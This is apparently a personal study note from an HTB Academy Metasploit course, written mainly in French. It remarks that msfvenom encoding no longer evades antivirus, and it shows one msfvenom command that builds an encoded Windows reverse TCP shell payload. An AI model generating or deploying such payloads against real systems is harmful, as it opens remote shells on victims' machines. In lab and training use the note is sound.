---
tags:
  - metasploit
  - msfvenom
  - evasion
  - av-evasion
  - course/htb-academy
---

msfvenum et l'encodage 仕方がない restent d'actualités même s'ils ne permettent pas d'AV evasion

```bash
Tximista64@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai

``` 

https://hatching.io/blog/metasploit-payloads2/
